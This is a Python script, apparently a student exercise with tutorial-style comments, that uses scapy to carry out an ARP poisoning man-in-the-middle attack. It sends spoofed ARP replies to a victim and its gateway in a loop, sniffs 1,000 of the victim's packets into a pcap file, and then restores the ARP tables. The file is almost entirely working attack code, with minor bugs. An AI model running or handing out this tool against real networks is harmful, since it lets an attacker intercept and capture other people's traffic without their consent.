from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, getmacbyip

import os
import sys
import time


class ARPPoisoningAttack():
    # the def init is how initialization of a class is done, very simmliar to java for those who didnt know
    def __init__(self, victim, gateway, interface="enp0s3"):
        self.victim = victim
        self.victimMac = getmacbyip(victim)
        self.gateway = gateway
        self.gatewayMac = getmacbyip(gateway)
        self.interface = interface
        iface = interface
        conf.verb = 0

        print('Initialized {}:'.format(interface))
        print('Gateway({}) is at {}.'.format(gateway, self.gatewayMac))
       # print(ans)
        print('Victim ({}) is at {}.'.format(victim, self.victimMac))
        print('-'*30)

    def run(self):
           #the reason we made this special self.run is because we want to run sniffing and poisioning to run  at the same time so it uses the 

        #muultiprocessing imort we made to make 2 threads
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        #note the op,psrc,pdst,hwdst are arttributes predefined in scapy
        #full forms op:operation code, psrc: protocol source, pdst: protocol destination, hwdst: hardware destination
        #these are from arp btw just look at wiki page not scapy docs on meaning of these for better details
        poison_victim = ARP()
        #just a cool note op is the opcode, remembr from the slides, it is set to 2 becase 2 is for replies remember?
        poison_victim[ARP].hwsrc = "08:00:27:D0:25:4B"
        #poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimMac

        #printing to be clean and help debugging and see that it works
        print('ip src: {}.'.format(poison_victim.psrc))
        print('ip dst: {}.'.format(poison_victim.pdst))
        print('mac dst: {}.'.format(poison_victim.hwdst))
        print('mac src: {}.'.format(poison_victim.hwsrc))
        print(poison_victim.summary())
        print('-'*30)

        poison_gateway = ARP()
        poison_gateway[ARP].hwsrc = "08:00:27:D0:25:4B"
        #poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewayMac

        print('ip src: {}.'.format(poison_gateway.psrc))
        print('ip dst: {}.'.format(poison_gateway.pdst))
        print('mac dst: {}.' .format(poison_gateway.hwdst))
        print('mac src: {}.' .format(poison_gateway.hwsrc))
        print(poison_gateway.summary())
        print('-'*30)
        print('Beginning the ARP Poisoning. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                #sending signal can read more on scapy
                send(poison_victim)
                send(poison_gateway)
            #to stop when CTRL-C pressed
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            #note this may be shocking but else is viable here how it works is that if there is no exception 
            #it will do else block
            else:
                time.sleep(2)

    def sniff(self, count=1000):
        time.sleep(5)
        print('Sniffing {} packets'.format(count))
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished')

    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewayMac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimMac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'), count=5)

# Starts the program
if __name__ == '__main__':
    # Assign parameters to variables
    victim = sys.argv[1]
    gateway = sys.argv[2]
    interface = sys.argv[3]
    # Initialize Attack
    attack = ARPPoisoningAttack(victim, gateway, interface)

    # Execute attack
    attack.run()
